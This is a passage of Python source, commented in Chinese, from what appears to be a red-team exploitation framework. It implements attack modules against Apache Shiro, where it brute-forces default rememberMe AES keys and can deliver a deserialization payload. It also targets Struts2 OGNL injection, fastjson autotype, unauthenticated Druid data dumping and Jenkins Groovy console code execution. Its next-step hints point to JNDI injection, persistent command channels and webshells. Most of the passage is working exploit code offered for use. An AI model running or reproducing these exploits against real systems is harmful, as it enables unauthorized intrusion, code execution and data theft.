    w = _aes128_expand(key)

    def subshift(s):
        s = [sbox[b] for b in s]
        out = [0] * 16
        for c in range(4):
            for r in range(4):
                out[4 * c + r] = s[4 * ((c + r) % 4) + r]
        return out

    def mixcol(s):
        out = [0] * 16
        for c in range(4):
            a = s[4 * c: 4 * c + 4]
            out[4 * c + 0] = _gf_mul(a[0], 2) ^ _gf_mul(a[1], 3) ^ a[2] ^ a[3]
            out[4 * c + 1] = a[0] ^ _gf_mul(a[1], 2) ^ _gf_mul(a[2], 3) ^ a[3]
            out[4 * c + 2] = a[0] ^ a[1] ^ _gf_mul(a[2], 2) ^ _gf_mul(a[3], 3)
            out[4 * c + 3] = _gf_mul(a[0], 3) ^ a[1] ^ a[2] ^ _gf_mul(a[3], 2)
        return out

    def addrk(s, rnd):
        for c in range(4):
            for r in range(4):
                s[4 * c + r] ^= w[4 * rnd + c][r]
        return s

    def block(b):
        s = list(b)
        s = addrk(s, 0)
        for rnd in range(1, 10):
            s = addrk(mixcol(subshift(s)), rnd)
        s = addrk(subshift(s), 10)
        return bytes(s)

    pad = 16 - (len(data) % 16)
    data = data + bytes([pad]) * pad
    out = b""
    prev = iv
    for i in range(0, len(data), 16):
        blk = bytes(x ^ y for x, y in zip(data[i:i + 16], prev))
        prev = block(blk)
        out += prev
    return out


# 空 java.util.HashMap 序列化流（JDK 标准 serialVersionUID，任意 Java 服务端必能成功
# 反序列化）：密钥正确 ⇒ 无 rememberMe=deleteMe；密钥错误 ⇒ 解密异常 ⇒ deleteMe。
# 序列化流由 JDK21 ObjectOutputStream 现场生成并与本库 AES 对拍验证。
_SHIRO_SER_HASHMAP = bytes.fromhex(
    "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d1030002"
    "46000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077"
    "08000000100000000078")

_SHIRO_KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",      # Shiro 1.2.4 默认
    "wGiHplamy0lZKTb5aP0LcQ==",
    "2AvVhdlsgUs0K3mZ2XYENA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "WcfHGUqg+ellVn7d1O7dvw==",
    "U3ByaW5nLUJvb3QtbG9naW4tMQ==",
    "bXRvbnM5LWhvbWVyaW50eg==",
]


def _shiro_cookie(key: bytes, payload: bytes, iv: bytes) -> str:
    ct = _aes128_cbc_encrypt(key, payload, iv)
    return base64.b64encode(iv + ct).decode()


@primitive("shiro-rememberme", "exploit", "http", "critical", products=["shiro"])
def shiro_rememberme(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    login_url = ctx.hints.get("shiro_login_url", "/login.jsp")
    garbage = base64.b64encode(os.urandom(48)).decode()

    def probe_cookie(cookie: str) -> Resp:
        return ctx.req("GET", login_url, {"Cookie": "rememberMe=" + cookie})

    def sets_deleteme(r: Resp) -> bool:
        sc = r.headers.get("set-cookie", "")
        return "rememberme=deleteme" in sc.lower()

    if step == "probe":
        clean = ctx.req("GET", login_url)
        bad = probe_cookie(garbage)
        pos = sets_deleteme(bad) and not sets_deleteme(clean)
        if pos:
            return Obs(True, "rememberMe 特征成立：垃圾 cookie 触发 deleteMe（Shiro rememberMe 开启）",
                       {"neg_clean": clean.status, "pos_bad": bad.status})
        return Obs(False, "无 rememberMe=deleteMe 特征（非 Shiro 或 rememberMe 关闭）",
                   {"clean": clean.status, "bad": bad.status})
    if step == "exploit":
        found = None
        tried = []
        for kb in _SHIRO_KEYS:
            key = base64.b64decode(kb)
            iv = os.urandom(16)
            cookie = _shiro_cookie(key, _SHIRO_SER_HASHMAP, iv)
            r = probe_cookie(cookie)
            tried.append(kb[:10])
            if not sets_deleteme(r):
                found = kb
                break
        if not found:
            return Obs(False, f"内置 {len(_SHIRO_KEYS)} 个密钥未命中（已更换默认密钥）")
        ctx.hints["_shiro_key"] = found
        o.ok = True
        o.detail = f"Shiro 密钥命中：{found}（AES-CBC oracle：正确密钥无 deleteMe）"
        o.gained = "shiro-key"
        o.evidence = {"key": found, "tried": tried, "oracle": "no-deleteMe"}
        o.next_steps = [
            "ysoserial gadget（CommonsBeanutils 系）经 rememberMe 加密回投（需 --execute，"
            "hint: shiro_payload_b64 提供 ysoserial 输出）",
            "redteam_vuln_add(critical, CVE-2016-4437)",
        ]
        # 可选：operator 自备 gadget payload，execute 模式下直接投递
        payload_b64 = ctx.hints.get("shiro_payload_b64")
        if payload_b64 and ctx.execute:
            key = base64.b64decode(found)
            cookie = _shiro_cookie(key, base64.b64decode(payload_b64), os.urandom(16))
            r = probe_cookie(cookie)
            o.evidence["payload_dispatched"] = [r.status, not sets_deleteme(r)]
            o.detail += f"；已投递自备 gadget payload（HTTP {r.status}）"
        return o
    if step == "verify":
        found = ctx.hints.get("_shiro_key")
        if not found:
            return Obs(False, "无已命中密钥可复测")
        key = base64.b64decode(found)
        pos = not sets_deleteme(probe_cookie(
            _shiro_cookie(key, _SHIRO_SER_HASHMAP, os.urandom(16))))
        # 阴性对照：错误密钥加密同一明文 ⇒ 必触发 deleteMe
        neg = sets_deleteme(probe_cookie(
            _shiro_cookie(os.urandom(16), _SHIRO_SER_HASHMAP, os.urandom(16))))
        o.ok = pos and neg
        o.detail = f"阳性(默认密钥无 deleteMe)={pos} 阴性(随机密钥触发 deleteMe)={neg}"
        o.evidence = {"key": found}
        return o
    return Obs(False, f"未知 step {step}")


# --- Struts2 S2-045/S2-046 Content-Type OGNL 数学回显 ------------------------
@primitive("struts2-ognl", "exploit", "http", "critical",
           ports=[8080, 80, 443], products=["struts2"])
def struts2_ognl(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    action = ctx.hints.get("struts_url", "/")

    def post_ct(ct: str) -> Resp:
        # S2-045：multipart 校验失败的错误页回显 Content-Type 原文，%{expr} 被求值
        return ctx.req("POST", action, {"Content-Type": ct},
                       b"--artex\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n--artex--\r\n")

    if step == "probe":
        # 良性数学表达式回显：1337*1337=1787569，只在 OGNL 被求值时出现
        r = post_ct("%{1337*1337} multipart/form-data")
        if "1787569" in r.text():
            return Obs(True, "S2-045 数学回显命中（1337*1337 → 1787569）",
                       {"status": r.status, "echo": "1787569", "variant": "s2-045"})
        # S2-046 变体：multipart 文件名注入
        b = "----artexs2"
        body = (f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; "
                f"filename=\"%{{1337*1337}}.txt\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--{b}--\r\n").encode()
        r2 = ctx.req("POST", action,
                     {"Content-Type": f"multipart/form-data; boundary={b}"}, body)
        if "1787569" in r2.text():
            return Obs(True, "S2-046 文件名数学回显命中", {"variant": "s2-046"})
        return Obs(False, f"无 OGNL 数学回显（{r.status}/{r2.status}）")
    if step == "exploit":
        # 非破坏性 oracle：随机化表达式二次确证（避免固定串巧合命中）
        a = random.randint(101, 989)
        b = random.randint(101, 989)
        r = post_ct(f"%{{{a}*{b}}} multipart/form-data")
        txt = r.text()
        expected = str(a * b)
        ctx.save("struts2-ognl.txt", txt)
        if expected in txt:
            o.ok = True
            o.detail = f"S2-045 OGNL 求值确认（{a}*{b} → {expected} 回显）"
            o.gained = "ognl-rce"
            o.evidence = {"expr": f"{a}*{b}", "expected": expected, "status": r.status}
            o.next_steps = ["OGNL RCE 收敛：命令回显 payload（需 --execute）",
                            "redteam_vuln_add(critical, S2-045)"]
        else:
            o.detail = f"复测未回显 {expected}（可能被 WAF 截断，见 struts2-ognl.txt）"
        return o
    if step == "verify":
        # 阳性：%{7*8} → 56 回显；阴性：字面 7*8（无 OGNL 包裹）不求值、56 不出现
        pos_r = post_ct("%{7*8} multipart/form-data")
        neg_r = post_ct("7*8 multipart/form-data")
        pos = "56" in pos_r.text()
        neg = "56" not in neg_r.text()
        o.ok = pos and neg
        o.detail = f"阳性(OGNL 求值回显 56)={pos} 阴性(字面量不求值)={neg}"
        o.evidence = {"pos_status": pos_r.status, "neg_status": neg_r.status}
        return o
    return Obs(False, f"未知 step {step}")


# --- fastjson autotype / 版本区间 ---------------------------------------------
@primitive("fastjson-rce", "exploit", "http", "high", requires=["json_url"],
           products=["fastjson"])
def fastjson_rce(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    url = ctx.hints["json_url"]

    def post(obj: dict) -> Resp:
        return ctx.req("POST", url, {"Content-Type": "application/json"},
                       json.dumps(obj).encode())

    def post_raw(txt: str) -> Resp:
        return ctx.req("POST", url, {"Content-Type": "application/json"}, txt.encode())

    if step == "probe":
        # 破损 JSON 报错回显判解析器身份（fastjson JSONException 特征串）
        r = post_raw('{"a":1')
        txt = r.text()
        is_fj = ("fastjson" in txt.lower() or "JSONException" in txt)
        if not is_fj:
            return Obs(False, f"报错非 fastjson 特征（{r.status}）", {"resp": txt[:200]})
        # autotype 探针：1.2.25+ 默认关 autotype → "autoType is not support"
        r2 = post({"@type": "com.alibaba.fastjson.JSONObject", "x": 1})
        t2 = r2.text()
        autotype_off = ("autoType" in t2 and "not support" in t2)
        ctx.hints["_fj_autotype_off"] = autotype_off
        ver_range = (">=1.2.25（autotype 收敛期）" if autotype_off
                     else "<=1.2.24 或 autotype 开放（1.2.25-47 绕过线）")
        return Obs(True, f"fastjson 判定（autotype_off={autotype_off}，区间 {ver_range}）",
                   {"error_echo": txt[:200], "autotype_off": autotype_off})
    if step == "exploit":
        autotype_off = ctx.hints.get("_fj_autotype_off")
        # JdbcRowSetImpl 探针：dataSourceName 用本地短串（无 JNDI 出网），观察行为分叉
        r = post({"@type": "com.sun.rowset.JdbcRowSetImpl",
                  "dataSourceName": "artex-local-probe", "autoCommit": True})
        t = r.text()
        ctx.save("fastjson-probe.txt", t)
        parsed_ok = r.status == 200 and "autoType" not in t and "Exception" not in t
        if parsed_ok:
            o.ok = True
            o.detail = "fastjson <=1.2.24 行为：@type 实例化未被拦截（autotype 完全开放）"
            o.gained = "fastjson-autotype"
            o.evidence = {"status": r.status, "range": "<=1.2.24", "resp": t[:200]}
            o.next_steps = ["JNDI 注入（JdbcRowSetImpl dataSourceName=ldap://[DOMAIN]）需 --execute",
                            "redteam_vuln_add(critical)"]
        elif not autotype_off:
            o.ok = True
            o.detail = "fastjson 1.2.25-1.2.47 特征：autotype 关闭但存在缓存绕过线"
            o.gained = "fastjson-autotype"
            o.evidence = {"status": r.status, "range": "1.2.25-1.2.47", "resp": t[:200]}
            o.next_steps = ["1.2.47 通杀 payload（java.lang.Class 缓存绕过）需 --execute",
                            "redteam_vuln_add(high)"]
        else:
            o.detail = f"autotype 关闭且探针被拒（1.2.48+ 或 safeMode）：{t[:120]}"
            o.evidence = {"status": r.status, "resp": t[:200]}
        return o
    if step == "verify":
        # 阳性：破损 JSON 仍报 fastjson 错；阴性：合法 JSON 正常 200 无异常
        r_bad = post_raw('{"a":1')
        pos = "fastjson" in r_bad.text().lower() or "JSONException" in r_bad.text()
        neg_r = post({"b": 2})
        neg = neg_r.status == 200 and "Exception" not in neg_r.text()
        o.ok = pos and neg
        o.detail = f"阳性(破损 JSON fastjson 报错)={pos} 阴性(合法 JSON 无异常)={neg}"
        o.evidence = {"neg_status": neg_r.status}
        return o
    return Obs(False, f"未知 step {step}")


# --- Druid 监控台未授权 --------------------------------------------------------
@primitive("druid-unauth", "exploit", "http", "high", products=["druid"])
def druid_unauth(ctx: Ctx, step: str) -> Obs:
    o = Obs()

    def page(path: str) -> Resp:
        return ctx.req("GET", path)

    if step == "probe":
        r = page("/druid/index.html")
        neg = page("/druid-" + uuid.uuid4().hex[:6] + ".html")
        body = r.text()
        pos = r.status == 200 and ("druid" in body.lower() or "Druid Stat" in body)
        if pos:
            return Obs(True, "Druid 监控台未授权可达（/druid/index.html）",
                       {"status": r.status, "neg_status": neg.status,
                        "title": title_of(r.body)})
        return Obs(False, f"监控台不可达（{r.status}）", {"neg_status": neg.status})
    if step == "exploit":
        api = {"weburi": "/druid/weburi.json", "datasource": "/druid/datasource.json",
               "sql": "/druid/sql.json", "spring": "/druid/spring.json"}
        leaked = {}
        for name, path in api.items():
            r = page(path)
            if r.status == 200 and len(r.body) > 30:
                try:
                    leaked[name] = json.loads(r.text())
                except Exception:
                    leaked[name] = r.text()[:500]
        pth = ctx.save("druid-leak.json", leaked)
        if leaked:
            o.ok = True
            o.detail = f"Druid 未授权：{list(leaked)} 接口泄露（URI/SQL/数据源画像）"
            o.gained = "info-disclosure"
            o.evidence = {"file": pth, "apis": list(leaked)}
            o.next_steps = ["SQL 语句中提取表结构/敏感数据", "数据源 JDBC 串中的凭据复用",
                            "redteam_vuln_add(high)"]
        else:
            o.detail = "index 可达但 API 均被拒（登录态保护）"
        return o
    if step == "verify":
        pos = page("/druid/index.html")
        neg = page("/druid-" + uuid.uuid4().hex[:6] + ".html")
        ok = pos.status == 200 and "druid" in pos.text().lower() and neg.status == 404
        o.ok = ok
        o.detail = f"阳性(index 200+特征)={pos.status} 阴性(随机路径 404)={neg.status}"
        o.evidence = {"pos": pos.status, "neg": neg.status}
        return o
    return Obs(False, f"未知 step {step}")


# --- Jenkins /script 控制台 + Groovy RCE ---------------------------------------
@primitive("jenkins-script", "exploit", "http", "critical", products=["jenkins"])
def jenkins_script(ctx: Ctx, step: str) -> Obs:
    o = Obs()

    def get(path: str, hdr: dict | None = None) -> Resp:
        return ctx.req("GET", path, hdr)

    def crumb() -> tuple[str, str]:
        r = get("/crumbIssuer/api/xml")
        txt = r.text()
        m = re.search(r"<crumb>([^<]+)</crumb>", txt)
        c = m.group(1) if m else ""
        f = re.search(r"<crumbRequestField>([^<]+)</crumbRequestField>", txt)
        field = f.group(1) if f else "Jenkins-Crumb"
        return field, c

    def run_groovy(script: str) -> Resp:
        field, c = crumb()
        hdr = {field: c} if c else {}
        hdr["Content-Type"] = "application/x-www-form-urlencoded"
        body = urllib.parse.urlencode({"script": script}).encode()
        return ctx.req("POST", "/script", hdr, body)

    if step == "probe":
        r = get("/script")
        body = r.text()
        unauth = (r.status == 200
                  and ("Script Console" in body or "Groovy" in body or 'name="script"' in body))
        if unauth:
            return Obs(True, "Jenkins Script Console 未授权可达", {"status": r.status})
        return Obs(False, f"/script 不可直接访问（{r.status}）",
                   {"status": r.status, "location": r.headers.get("location", "")})
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            # 未授权判定本身即高危结论；Groovy RCE 只在 --execute 下执行
            r = get("/script")
            o.ok = r.status == 200
            o.detail = "dry-run：控制台未授权已确认，Groovy RCE 需 --execute"
            o.gained = "console-unauth"
            o.evidence = {"status": r.status}
            o.next_steps = ["--execute 下 println 标记探针实测 RCE"]
            return o
        r = run_groovy(f'println "{MARK}"')
        txt = r.text()
        ctx.save("jenkins-script.txt", txt)
        if MARK in txt:
            o.ok = True
            o.detail = "Jenkins Groovy 控制台 RCE 实测（println 标记回显）"
            o.gained = "shell-channel"
            o.evidence = {"marker": MARK, "status": r.status, "out": txt[:300]}
            o.next_steps = ["Groovy 'def p=\"id\".execute().text' 持久通道",
                            "redteam_webshell_add / post-unix-enum"]
        else:
            o.detail = f"Groovy 未回显标记（{r.status}）：{txt[:120]!r}"
            o.evidence = {"status": r.status}
        return o
    if step == "verify":
        if not ctx.execute:
            # dry-run：复测控制台可达性 + 随机路径阴性
            pos = get("/script")
            neg = get("/script-" + uuid.uuid4().hex[:6])
            ok = pos.status == 200 and neg.status in (404, 400)
            return Obs(ok, f"阳性(/script 200)={pos.status} 阴性(随机路径)={neg.status}")
        pos_r = run_groovy(f'println "verify-{MARK}"')
        # 阴性：无 crumb 的裸 POST 应被 CSRF 拒绝（403），且不含正向标记
        neg_r = ctx.req("POST", "/script",
                        {"Content-Type": "application/x-www-form-urlencoded"},
                        urllib.parse.urlencode({"script": 'println "nope"'}).encode())
        pos = f"verify-{MARK}" in pos_r.text()
        neg = "nope" not in neg_r.text() and neg_r.status in (403, 401, 400)
        o.ok = pos and neg
        o.detail = f"阳性(标记回显)={pos} 阴性(无 crumb POST 被拒 {neg_r.status})={neg}"
        o.evidence = {"pos_status": pos_r.status, "neg_status": neg_r.status}
        return o
    return Obs(False, f"未知 step {step}")
